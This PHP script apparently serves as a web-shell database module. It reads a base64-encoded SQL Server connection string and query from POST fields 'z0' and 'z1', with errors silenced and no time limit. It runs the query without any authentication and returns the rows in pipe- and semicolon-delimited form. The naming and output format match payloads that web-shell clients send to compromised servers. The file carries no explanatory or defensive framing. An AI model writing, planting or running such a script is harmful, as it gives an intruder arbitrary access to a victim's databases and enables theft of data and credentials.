<?php

@ini_set('display_errors','0');
@set_time_limit(0);

if (!extension_loaded('sqlsrv'))
    die('0|Module \'sqlsrv\' is unavailable.');

$connStr = base64_decode($_POST['z0'] ?? '');
$szQuery = base64_decode($_POST['z1'] ?? '');

$colSplitter = "|";
$rowSplitter = ";";

function parseConn($str)
{
    $out = [];
    foreach (explode(';', $str) as $part) {
        if (strpos($part, '=') !== false) {
            [$k, $v] = explode('=', $part, 2);
            $out[trim($k)] = trim($v);
        }
    }
    return $out;
}

$cfg = parseConn($connStr);

$server = $cfg['Server'] ?? $cfg['Data Source'] ?? '';
$db = $cfg['Database'] ?? $cfg['Initial Catalog'] ?? '';
$user = $cfg['User Id'] ?? $cfg['UID'] ?? '';
$pass = $cfg['Password'] ?? $cfg['PWD'] ?? '';

$connectionInfo = [
    "Database" => $db,
    "UID" => $user,
    "PWD" => $pass,
    "CharacterSet" => "UTF-8"
];

$conn = sqlsrv_connect($server, $connectionInfo);

if ($conn === false) {
    die(print_r(sqlsrv_errors(), true));
}

// connection test only
if (trim($szQuery) == "") {
    echo "1|";
    sqlsrv_close($conn);

    exit;
}

$stmt = sqlsrv_query($conn, $szQuery);

if ($stmt === false) {
    die('0|' . print_r(sqlsrv_errors(), true));
}

$outputRows = [];

while ($row = sqlsrv_fetch_array($stmt, SQLSRV_FETCH_ASSOC)) {
    $outputRows[] = implode($colSplitter, $row);
}

echo implode($rowSplitter, $outputRows);

sqlsrv_close($conn);

?>